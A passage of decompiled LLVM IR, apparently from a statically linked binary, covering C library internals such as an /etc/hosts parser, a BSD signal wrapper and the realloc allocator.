  %v0_8057bfd = load i32, i32* @esi, align 4
  %v1_8057bfd = add i32 %v0_8057bfd, 1
  store i32 %v1_8057bfd, i32* @esi, align 4
  %v1_8057bfe = load i32, i32* @ebx, align 4
  %v2_8057bfe = mul i32 %v1_8057bfe, 4
  %v3_8057bfe = add i32 %v2_8057bfe, 134642356
  %v4_8057bfe = inttoptr i32 %v3_8057bfe to i32*
  store i32 %v2_8057bf8, i32* %v4_8057bfe, align 4
  %v0_8057c05 = load i32, i32* @ebx, align 4
  %v1_8057c05 = add i32 %v0_8057c05, 1
  store i32 %v1_8057c05, i32* @eax, align 4
  store i32 %v1_8057c05, i32* @global_var_8067ac0.234, align 64
  %v0_8057c10.pre = load i32, i32* @esi, align 4
  %v5_8057c14 = icmp slt i32 %v0_8057c10.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8057c14, label %dec_label_pc_8057c16, label %dec_label_pc_8057c21

dec_label_pc_8057c16:                             ; preds = %dec_label_pc_8057c16.lr.ph, %dec_label_pc_8057bee
  %v0_8057c16 = phi i32 [ %v0_8057c16.pre, %dec_label_pc_8057c16.lr.ph ], [ %v1_8057c05, %dec_label_pc_8057bee ]
  %v1_8057bf196 = phi i32 [ 1, %dec_label_pc_8057c16.lr.ph ], [ %v0_8057c10.pre, %dec_label_pc_8057bee ]
  store i32 %v0_8057c16, i32* @ebx, align 4
  %v7_8057c1f = icmp sgt i32 %v0_8057c16, 2
  br i1 %v7_8057c1f, label %dec_label_pc_8057c21, label %dec_label_pc_8057bee

dec_label_pc_8057c21:                             ; preds = %dec_label_pc_8057c10.preheader, %dec_label_pc_8057bee, %dec_label_pc_8057c16, %dec_label_pc_8057bcc
  %v0_8057c21 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805cc3e.325 to i32), i32* %stack_var_-216, align 4
  %v0_8057c28 = load i32, i32* @edi, align 4
  %v4_8057c29 = inttoptr i32 %v0_8057c28 to i8*
  %v5_8057c29 = call i32 @__GI_strcoll(i8* %v4_8057c29, i32 ptrtoint ([7 x i8]* @global_var_805cc3e.325 to i32), i32 %v0_8057c21, i32 %v0_8057c21)
  store i32 %v5_8057c29, i32* @eax, align 4
  %v1_8057c31 = icmp eq i32 %v5_8057c29, 0
  br i1 %v1_8057c31, label %dec_label_pc_8057c73.preheader, label %dec_label_pc_8057c35

dec_label_pc_8057c35:                             ; preds = %dec_label_pc_8057c21
  %v0_8057c35 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805cc45.326 to i32), i32* %stack_var_-216, align 4
  %v0_8057c3c = load i32, i32* @edi, align 4
  %v4_8057c3d = inttoptr i32 %v0_8057c3c to i8*
  %v5_8057c3d = call i32 @__GI_strcoll(i8* %v4_8057c3d, i32 ptrtoint ([7 x i8]* @global_var_805cc45.326 to i32), i32 %v0_8057c35, i32 %v0_8057c35)
  %v1_8057c45 = icmp eq i32 %v5_8057c3d, 0
  br i1 %v1_8057c45, label %dec_label_pc_8057c73.preheader, label %dec_label_pc_8057cb6

dec_label_pc_8057c73.preheader:                   ; preds = %dec_label_pc_8057c21, %dec_label_pc_8057c35
  %v0_8057c7397 = load i32, i32* @global_var_8067ac4.319, align 4
  %tmp4599 = icmp slt i32 %v0_8057c7397, 1
  %tmp46100 = icmp eq i1 %tmp4599, false
  br i1 %tmp46100, label %dec_label_pc_8057c4b, label %dec_label_pc_8057c7c

dec_label_pc_8057c4b:                             ; preds = %dec_label_pc_8057c73.preheader, %dec_label_pc_8057c4b.dec_label_pc_8057c4b_crit_edge
  %v0_8057c73101 = phi i32 [ %v0_8057c73, %dec_label_pc_8057c4b.dec_label_pc_8057c4b_crit_edge ], [ %v0_8057c7397, %dec_label_pc_8057c73.preheader ]
  %v1_8057c4b = add i32 %v0_8057c73101, -1
  store i32 %v1_8057c4b, i32* @global_var_8067ac4.319, align 4
  %v1_8057c54 = mul i32 %v1_8057c4b, 4
  %v2_8057c54 = add i32 %v1_8057c54, 134642340
  %v3_8057c54 = inttoptr i32 %v2_8057c54 to i32*
  %v4_8057c54 = load i32, i32* %v3_8057c54, align 4
  %v1_8057c5b = call i32 @free(i32 %v4_8057c54)
  %v0_8057c60 = load i32, i32* @global_var_8067ac4.319, align 4
  %v1_8057c68 = mul i32 %v0_8057c60, 4
  %v2_8057c68 = add i32 %v1_8057c68, ptrtoint (i32* @global_var_8067aa4.327 to i32)
  %v3_8057c68 = inttoptr i32 %v2_8057c68 to i32*
  store i32 0, i32* %v3_8057c68, align 4
  %v0_8057c73 = load i32, i32* @global_var_8067ac4.319, align 4
  %tmp45 = icmp slt i32 %v0_8057c73, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_8057c4b.dec_label_pc_8057c4b_crit_edge, label %dec_label_pc_8057c7c

dec_label_pc_8057c4b.dec_label_pc_8057c4b_crit_edge: ; preds = %dec_label_pc_8057c4b
  br label %dec_label_pc_8057c4b

dec_label_pc_8057c7c:                             ; preds = %dec_label_pc_8057c4b, %dec_label_pc_8057c73.preheader
  %v0_8057c73.lcssa = phi i32 [ %v0_8057c7397, %dec_label_pc_8057c73.preheader ], [ %v0_8057c73, %dec_label_pc_8057c4b ]
  store i32 1, i32* @esi, align 4
  %v5_8057ca9110 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8057ca9110, label %dec_label_pc_8057cab, label %dec_label_pc_8057cb6

dec_label_pc_8057c83:                             ; preds = %dec_label_pc_8057cab
  %v2_8057c86 = mul i32 %v1_8057c86112, 4
  %v4_8057c86 = add i32 %v2_8057c86, %v3_8057bf1
  %v5_8057c86 = inttoptr i32 %v4_8057c86 to i32*
  %v6_8057c86 = load i32, i32* %v5_8057c86, align 4
  %v1_8057c8d = inttoptr i32 %v6_8057c86 to i8*
  %v2_8057c8d = call i32 @__GI_strdup(i8* %v1_8057c8d)
  %v0_8057c92 = load i32, i32* @esi, align 4
  %v1_8057c92 = add i32 %v0_8057c92, 1
  store i32 %v1_8057c92, i32* @esi, align 4
  %v1_8057c93 = load i32, i32* @ebx, align 4
  %v2_8057c93 = mul i32 %v1_8057c93, 4
  %v3_8057c93 = add i32 %v2_8057c93, 134642340
  %v4_8057c93 = inttoptr i32 %v3_8057c93 to i32*
  store i32 %v2_8057c8d, i32* %v4_8057c93, align 4
  %v0_8057c9a = load i32, i32* @ebx, align 4
  %v1_8057c9a = add i32 %v0_8057c9a, 1
  store i32 %v1_8057c9a, i32* @global_var_8067ac4.319, align 4
  %v0_8057ca5.pre = load i32, i32* @esi, align 4
  %v5_8057ca9 = icmp slt i32 %v0_8057ca5.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8057ca9, label %dec_label_pc_8057cab, label %dec_label_pc_8057cb6

dec_label_pc_8057cab:                             ; preds = %dec_label_pc_8057c7c, %dec_label_pc_8057c83
  %v1_8057c86112 = phi i32 [ %v0_8057ca5.pre, %dec_label_pc_8057c83 ], [ 1, %dec_label_pc_8057c7c ]
  %v0_8057cab111 = phi i32 [ %v1_8057c9a, %dec_label_pc_8057c83 ], [ %v0_8057c73.lcssa, %dec_label_pc_8057c7c ]
  store i32 %v0_8057cab111, i32* @ebx, align 4
  %v7_8057cb4 = icmp sgt i32 %v0_8057cab111, 3
  br i1 %v7_8057cb4, label %dec_label_pc_8057cb6, label %dec_label_pc_8057c83

dec_label_pc_8057cb6:                             ; preds = %dec_label_pc_8057b43.preheader, %dec_label_pc_8057b42, %dec_label_pc_8057c7c, %dec_label_pc_8057cab, %dec_label_pc_8057c83, %dec_label_pc_8057c35, %dec_label_pc_8057b64, %dec_label_pc_8057b5b, %dec_label_pc_8057cb6.preheader
  %v0_8057cb6 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8057cbd, i32* @ebx, align 4
  %v3_8057cc2 = call i32 @fgets(i32 %v2_8057cbd, i32 128, i32 %v0_8057cb6)
  %v1_8057cca = icmp eq i32 %v3_8057cc2, 0
  %v1_8057ccc = icmp eq i1 %v1_8057cca, false
  br i1 %v1_8057ccc, label %dec_label_pc_8057b43.preheader, label %dec_label_pc_8057cd2

dec_label_pc_8057b43.preheader:                   ; preds = %dec_label_pc_8057cb6
  %v0_8057b43.pre = load i32, i32* @ebx, align 4
  %v4_8057b43.pre = load i32, i32* @ecx, align 4
  %v1_8057b4351 = inttoptr i32 %v0_8057b43.pre to i8*
  %v2_8057b4352 = load i8, i8* %v1_8057b4351, align 1
  %v3_8057b4353 = zext i8 %v2_8057b4352 to i32
  %v5_8057b4354 = and i32 %v4_8057b43.pre, -256
  %v6_8057b4355 = or i32 %v3_8057b4353, %v5_8057b4354
  store i32 %v6_8057b4355, i32* @ecx, align 4
  %v4_8057b4556 = icmp eq i8 %v2_8057b4352, 0
  br i1 %v4_8057b4556, label %dec_label_pc_8057cb6, label %dec_label_pc_8057b4d.lr.ph

dec_label_pc_8057b4d.lr.ph:                       ; preds = %dec_label_pc_8057b43.preheader
  %v0_8057b50.pre = load i32, i32* @global_var_8062a20, align 32
  br label %dec_label_pc_8057b4d

dec_label_pc_8057cd2:                             ; preds = %dec_label_pc_8057cb6
  %v0_8057cd5 = load i32, i32* @ebp, align 4
  %v1_8057cd6 = inttoptr i32 %v0_8057cd5 to i16*
  %v2_8057cd6 = call i32 @__GI_fclose(i16* %v1_8057cd6)
  br label %dec_label_pc_8057ceb

dec_label_pc_8057ce0:                             ; preds = %dec_label_pc_8057b1f
  %v0_8057ce0 = call i32 @__GI___h_errno_location()
  %v1_8057ce5 = inttoptr i32 %v0_8057ce0 to i32*
  store i32 3, i32* %v1_8057ce5, align 4
  br label %dec_label_pc_8057ceb

dec_label_pc_8057ceb:                             ; preds = %entry, %dec_label_pc_8057cd2, %dec_label_pc_8057ce0
  store i32 1, i32* %stack_var_-216, align 4
  %v3_8057cf7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v0_8057ac6, i32* @esi, align 4
  store i32 %v0_8057ac5, i32* @edi, align 4
  store i32 %v0_8057ac4, i32* @ebp, align 4
  ret i32 %v3_8057cf7

; uselistorder directives
  uselistorder i32 %v0_8057b50.pre, { 1, 0 }
  uselistorder i32 %v6_8057b4355, { 1, 0 }
  uselistorder i8 %v2_8057b4352, { 1, 2, 0 }
  uselistorder i8* %v1_8057b4351, { 1, 0 }
  uselistorder i32 %v0_8057b43.pre, { 1, 0 }
  uselistorder i32 %v0_8057c73, { 0, 2, 1 }
  uselistorder i32 %v1_8057c4b, { 1, 0 }
  uselistorder i32 %v0_8057c16, { 1, 0 }
  uselistorder i32 %v0_8057c10.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8057ba9, { 1, 0 }
  uselistorder i8 %v2_8057ba383, { 1, 0 }
  uselistorder i32 %v2_8057b8a, { 1, 0 }
  uselistorder i8 %v2_8057b8468, { 1, 0 }
  uselistorder i32 %v1_8057b83, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8057b4d, { 1, 0 }
  uselistorder i32 %v1_8057b42, { 1, 0, 2 }
  uselistorder i32 %v2_8057b2b, { 1, 0 }
  uselistorder i32 %v2_8057b0d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_8067ac4.319, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 164, { 3, 0, 1, 2, 4 }
  uselistorder i32* @global_var_8067ac0.234, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8062a48.233 to i32), { 3, 1, 5, 6, 7, 8, 9, 10, 0, 4, 11, 2 }
  uselistorder label %dec_label_pc_8057ceb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057cb6, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8057cab, { 1, 0 }
  uselistorder label %dec_label_pc_8057c4b, { 1, 0 }
  uselistorder label %dec_label_pc_8057c73.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057c21, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8057c16, { 1, 0 }
  uselistorder label %dec_label_pc_8057bcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057bc5, { 1, 0 }
  uselistorder label %dec_label_pc_8057bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057ba9, { 1, 0 }
  uselistorder label %dec_label_pc_8057b8a, { 1, 0 }
  uselistorder label %dec_label_pc_8057cb6.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8057d2b = inttoptr i32 %arg3 to i32*
  %v10_8057d2b = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8057d2b, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8057d2b
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8057d34 = load i32, i32* @ebx, align 4
  %v15_8057d35 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8057d49 = icmp eq i32 %arg2, -1
  br i1 %v10_8057d49, label %dec_label_pc_8057d57, label %dec_label_pc_8057d4e

dec_label_pc_8057d4e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8057d57, label %dec_label_pc_8057d52

dec_label_pc_8057d52:                             ; preds = %dec_label_pc_8057d4e
  %v7_8057d55 = icmp sgt i32 %arg1, 64
  br i1 %v7_8057d55, label %dec_label_pc_8057d57, label %dec_label_pc_8057d64

dec_label_pc_8057d57:                             ; preds = %dec_label_pc_8057d52, %dec_label_pc_8057d4e, %entry
  %v1_8057d57 = call i32 @__errno_location(i32 %v0_8057d34)
  store i32 %v1_8057d57, i32* %eax.global-to-local, align 4
  %v1_8057d5c = inttoptr i32 %v1_8057d57 to i32*
  store i32 22, i32* %v1_8057d5c, align 4
  br label %dec_label_pc_8057dd8

dec_label_pc_8057d64:                             ; preds = %dec_label_pc_8057d52
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057d72

dec_label_pc_8057d72:                             ; preds = %dec_label_pc_8057d72.dec_label_pc_8057d72_crit_edge, %dec_label_pc_8057d64
  %v0_8057d72 = phi i32 [ %v15_8057d35, %dec_label_pc_8057d64 ], [ %v0_8057d72.pre, %dec_label_pc_8057d72.dec_label_pc_8057d72_crit_edge ]
  %v1_8057d7d17 = phi i32 [ 31, %dec_label_pc_8057d64 ], [ %v1_8057d7d, %dec_label_pc_8057d72.dec_label_pc_8057d72_crit_edge ]
  %v2_8057d72 = mul i32 %v1_8057d7d17, 4
  %v3_8057d72 = add i32 %v2_8057d72, 160
  %v4_8057d72 = add i32 %v3_8057d72, %v0_8057d72
  %v5_8057d72 = inttoptr i32 %v4_8057d72 to i32*
  store i32 0, i32* %v5_8057d72, align 4
  %v0_8057d7d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8057d7d = add i32 %v0_8057d7d.pre, -1
  %v9_8057d7d = icmp slt i32 %v1_8057d7d, 0
  store i32 %v1_8057d7d, i32* %eax.global-to-local, align 4
  %v1_8057d7e = icmp eq i1 %v9_8057d7d, false
  br i1 %v1_8057d7e, label %dec_label_pc_8057d72.dec_label_pc_8057d72_crit_edge, label %dec_label_pc_8057d80

dec_label_pc_8057d72.dec_label_pc_8057d72_crit_edge: ; preds = %dec_label_pc_8057d72
  %v0_8057d72.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057d72

dec_label_pc_8057d80:                             ; preds = %dec_label_pc_8057d72
  %v0_8057d80 = load i32, i32* @edx, align 4
  %v2_8057d83 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8057d83, i32* %eax.global-to-local, align 4
  %v4_8057d8b = call i32 @__sigaddset(i32 %v2_8057d83, i32 %arg1, i32 %v0_8057d80, i32 %v0_8057d80)
  store i32 %v4_8057d8b, i32* %eax.global-to-local, align 4
  %v2_8057d93 = icmp slt i32 %v4_8057d8b, 0
  br i1 %v2_8057d93, label %dec_label_pc_8057dd8, label %dec_label_pc_8057d97

dec_label_pc_8057d97:                             ; preds = %dec_label_pc_8057d80
  %v4_8057d9f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8067ae0.328 to i32), i32 %arg1, i32 %v4_8057d8b, i32 %v4_8057d8b)
  %v2_8057db8 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8057dbd = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8057dbd, i32* %eax.global-to-local, align 4
  %v4_8057dc6 = call i32 @__GI_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8057db8)
  store i32 %v4_8057dc6, i32* %eax.global-to-local, align 4
  %v2_8057dce = icmp slt i32 %v4_8057dc6, 0
  br i1 %v2_8057dce, label %dec_label_pc_8057dd8, label %dec_label_pc_8057dd2

dec_label_pc_8057dd2:                             ; preds = %dec_label_pc_8057d97
  %v3_8057dd2 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8057ddb

dec_label_pc_8057dd8:                             ; preds = %dec_label_pc_8057d97, %dec_label_pc_8057d80, %dec_label_pc_8057d57
  br label %dec_label_pc_8057ddb

dec_label_pc_8057ddb:                             ; preds = %dec_label_pc_8057dd2, %dec_label_pc_8057dd8
  %storemerge = phi i32 [ -1, %dec_label_pc_8057dd8 ], [ %v3_8057dd2, %dec_label_pc_8057dd2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8057d34, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057d7d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 160, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057ddb, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8057de4 = load i32, i32* @ebp, align 4
  %v0_8057de5 = load i32, i32* @edi, align 4
  %v0_8057de6 = load i32, i32* @esi, align 4
  %v0_8057de7 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8057def = icmp eq i32* %arg1, null
  %v1_8057df4 = icmp eq i1 %v4_8057def, false
  br i1 %v1_8057df4, label %dec_label_pc_8057e06, label %dec_label_pc_8057df6

dec_label_pc_8057df6:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8057dfa = call i32 @malloc(i32 %arg2)
  store i32 %v1_8057dfa, i32* %eax.global-to-local, align 4
  store i32 %v1_8057dfa, i32* @ebx, align 4
  br label %dec_label_pc_80580ff

dec_label_pc_8057e06:                             ; preds = %entry
  %v1_8057e06 = icmp eq i32 %arg2, 0
  %v1_8057e08 = icmp eq i1 %v1_8057e06, false
  br i1 %v1_8057e08, label %dec_label_pc_8057e1b, label %dec_label_pc_8057e0a

dec_label_pc_8057e0a:                             ; preds = %dec_label_pc_8057e06
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8057e11 = call i32 @free(i32 %tmp7)
  store i32 %v1_8057e11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80580ff

dec_label_pc_8057e1b:                             ; preds = %dec_label_pc_8057e06
  %v2_8057e26 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057e26, i32* %eax.global-to-local, align 4
  store i32 %v2_8057e26, i32* %stack_var_-60, align 4
  %v4_8057e2b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v4_8057e2b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062910.167 to i32), i32* %stack_var_-60, align 4
  %v1_8057e37 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v1_8057e37, i32* %eax.global-to-local, align 4
  %v0_8057e3f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8057e3f, -32
  br i1 %tmp, label %dec_label_pc_8057e56, label %dec_label_pc_8057e44

dec_label_pc_8057e44:                             ; preds = %dec_label_pc_8057e1b
  %v0_8057e44 = load i32, i32* %stack_var_-60, align 4
  %v1_8057e44 = call i32 @__errno_location(i32 %v0_8057e44)
  store i32 %v1_8057e44, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8057e4b = inttoptr i32 %v1_8057e44 to i32*
  store i32 12, i32* %v1_8057e4b, align 4
  br label %dec_label_pc_8058102

dec_label_pc_8057e56:                             ; preds = %dec_label_pc_8057e1b
  %v1_8057e56 = add i32 %v0_8057e3f, 11
  %tmp20 = icmp ult i32 %v1_8057e56, 16
  br i1 %tmp20, label %dec_label_pc_8057e6d, label %dec_label_pc_8057e66

dec_label_pc_8057e66:                             ; preds = %dec_label_pc_8057e56
  %v1_8057e66 = and i32 %v1_8057e56, -8
  br label %dec_label_pc_8057e6d

dec_label_pc_8057e6d:                             ; preds = %dec_label_pc_8057e56, %dec_label_pc_8057e66
  %stack_var_-40.0 = phi i32 [ %v1_8057e66, %dec_label_pc_8057e66 ], [ 16, %dec_label_pc_8057e56 ]
  %storemerge24 = phi i32 [ %v1_8057e66, %dec_label_pc_8057e66 ], [ %v1_8057e56, %dec_label_pc_8057e56 ]
  store i32 %storemerge24, i32* %eax.global-to-local, align 4
  %v1_8057e71 = add i32 %tmp7, -8
  store i32 %v1_8057e71, i32* @edi, align 4
  %v1_8057e74 = add i32 %tmp7, -4
  %v2_8057e74 = inttoptr i32 %v1_8057e74 to i32*
  %v3_8057e74 = load i32, i32* %v2_8057e74, align 4
  store i32 %v3_8057e74, i32* %edx.global-to-local, align 4
  %v1_8057e79 = and i32 %v3_8057e74, -4
  store i32 %v1_8057e79, i32* %eax.global-to-local, align 4
  %v2_8057e80 = and i32 %v3_8057e74, 2
  %v3_8057e80 = icmp eq i32 %v2_8057e80, 0
  %v1_8057e83 = icmp eq i1 %v3_8057e80, false
  br i1 %v1_8057e83, label %dec_label_pc_805801d, label %dec_label_pc_8057e89

dec_label_pc_8057e89:                             ; preds = %dec_label_pc_8057e6d
  store i32 %stack_var_-40.0, i32* @ecx, align 4
  store i32 %v1_8057e79, i32* @ebx, align 4
  %v7_8057e8f = icmp ult i32 %v1_8057e79, %stack_var_-40.0
  %v1_8057e91 = icmp eq i1 %v7_8057e8f, false
  br i1 %v1_8057e91, label %dec_label_pc_8057fc8, label %dec_label_pc_8057e97

dec_label_pc_8057e97:                             ; preds = %dec_label_pc_8057e89
  %v2_8057e97 = add i32 %v1_8057e79, %v1_8057e71
  store i32 %v2_8057e97, i32* @esi, align 4
  %v1_8057e9a = load i32, i32* @global_var_80676ac.237, align 4
  %v12_8057e9a = icmp eq i32 %v2_8057e97, %v1_8057e9a
  %v1_8057ea0 = icmp eq i1 %v12_8057e9a, false
  %v1_8057eda = add i32 %v2_8057e97, 4
  %v2_8057eda = inttoptr i32 %v1_8057eda to i32*
  %v3_8057eda = load i32, i32* %v2_8057eda, align 4
  br i1 %v1_8057ea0, label %dec_label_pc_8057eda, label %dec_label_pc_8057ea2

dec_label_pc_8057ea2:                             ; preds = %dec_label_pc_8057e97
  %v1_8057ea7 = and i32 %v3_8057eda, -4
  %v2_8057eaa = add i32 %v1_8057ea7, %v1_8057e79
  store i32 %v2_8057eaa, i32* @ecx, align 4
  %v1_8057eb0 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8057eb0, i32* %eax.global-to-local, align 4
  %v7_8057eb3 = icmp ult i32 %v2_8057eaa, %v1_8057eb0
  br i1 %v7_8057eb3, label %dec_label_pc_8057f18, label %dec_label_pc_8057eb7

dec_label_pc_8057eb7:                             ; preds = %dec_label_pc_8057ea2
  %v1_8057eb7 = urem i32 %v3_8057e74, 2
  %v5_8057eba = or i32 %v1_8057eb7, %stack_var_-40.0
  store i32 %v5_8057eba, i32* %edx.global-to-local, align 4
  store i32 %v5_8057eba, i32* %v2_8057e74, align 4
  %v0_8057ec5 = load i32, i32* @ecx, align 4
  %v2_8057ec5 = sub i32 %v0_8057ec5, %stack_var_-40.0
  %v0_8057ec7 = load i32, i32* @edi, align 4
  %v2_8057ec7 = add i32 %v0_8057ec7, %stack_var_-40.0
  store i32 %v2_8057ec7, i32* %eax.global-to-local, align 4
  %v1_8057eca = or i32 %v2_8057ec5, 1
  store i32 %v1_8057eca, i32* @ecx, align 4
  store i32 %v2_8057ec7, i32* @global_var_80676ac.237, align 4
  %v2_8057ed2 = add i32 %v2_8057ec7, 4
  %v3_8057ed2 = inttoptr i32 %v2_8057ed2 to i32*
  store i32 %v1_8057eca, i32* %v3_8057ed2, align 4
  br label %dec_label_pc_80580ed

dec_label_pc_8057eda:                             ; preds = %dec_label_pc_8057e97
  store i32 %v3_8057eda, i32* %edx.global-to-local, align 4
  %v1_8057edf = and i32 %v3_8057eda, -2
  store i32 %v1_8057edf, i32* %eax.global-to-local, align 4
  %v3_8057ee2 = add i32 %v1_8057eda, %v1_8057edf
  %v4_8057ee2 = inttoptr i32 %v3_8057ee2 to i8*
  %v5_8057ee2 = load i8, i8* %v4_8057ee2, align 1
  %v6_8057ee2 = urem i8 %v5_8057ee2, 2
  %v7_8057ee2 = icmp eq i8 %v6_8057ee2, 0
  %v1_8057ee7 = icmp eq i1 %v7_8057ee2, false
  br i1 %v1_8057ee7, label %dec_label_pc_8057f18, label %dec_label_pc_8057ee9

dec_label_pc_8057ee9:                             ; preds = %dec_label_pc_8057eda
  %v1_8057ee9 = and i32 %v3_8057eda, -4
  store i32 %v1_8057ee9, i32* %edx.global-to-local, align 4
  %v2_8057ef0 = add i32 %v1_8057ee9, %v1_8057e79
  store i32 %v2_8057ef0, i32* @ebx, align 4
  %v10_8057ef2 = icmp ult i32 %v2_8057ef0, %stack_var_-40.0
  br i1 %v10_8057ef2, label %dec_label_pc_8057f18, label %dec_label_pc_8057ef8

dec_label_pc_8057ef8:                             ; preds = %dec_label_pc_8057ee9
  %v1_8057ef8 = add i32 %v1_8057e79, %tmp7
  %v2_8057ef8 = inttoptr i32 %v1_8057ef8 to i32*
  %v3_8057ef8 = load i32, i32* %v2_8057ef8, align 4
  store i32 %v3_8057ef8, i32* @edx, align 4
  %v1_8057efb = add i32 %v2_8057e97, 12
  %v2_8057efb = inttoptr i32 %v1_8057efb to i32*
  %v3_8057efb = load i32, i32* %v2_8057efb, align 4
  store i32 %v3_8057efb, i32* %eax.global-to-local, align 4
  %v1_8057efe = add i32 %v3_8057ef8, 12
  %v2_8057efe = inttoptr i32 %v1_8057efe to i32*
  %v3_8057efe = load i32, i32* %v2_8057efe, align 4
  %v15_8057efe = icmp eq i32 %v3_8057efe, %v2_8057e97
  %v1_8057f01 = icmp eq i1 %v15_8057efe, false
  br i1 %v1_8057f01, label %dec_label_pc_8057f08, label %dec_label_pc_8057f03

dec_label_pc_8057f03:                             ; preds = %dec_label_pc_8057ef8
  %v1_8057f03 = add i32 %v3_8057efb, 8
  %v2_8057f03 = inttoptr i32 %v1_8057f03 to i32*
  %v3_8057f03 = load i32, i32* %v2_8057f03, align 4
  %v15_8057f03 = icmp eq i32 %v3_8057f03, %v2_8057e97
  br i1 %v15_8057f03, label %dec_label_pc_8057f0d, label %dec_label_pc_8057f08

dec_label_pc_8057f08:                             ; preds = %dec_label_pc_8057f03, %dec_label_pc_8057ef8
  %v0_8057f08 = call i32 @abort()
  store i32 %v0_8057f08, i32* %eax.global-to-local, align 4
  %v1_8057f0d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057f0d

dec_label_pc_8057f0d:                             ; preds = %dec_label_pc_8057f03, %dec_label_pc_8057f08
  %v1_8057f0d = phi i32 [ %v3_8057ef8, %dec_label_pc_8057f03 ], [ %v1_8057f0d.pre, %dec_label_pc_8057f08 ]
  %v0_8057f0d = phi i32 [ %v3_8057efb, %dec_label_pc_8057f03 ], [ %v0_8057f08, %dec_label_pc_8057f08 ]
  %v2_8057f0d = add i32 %v1_8057f0d, 12
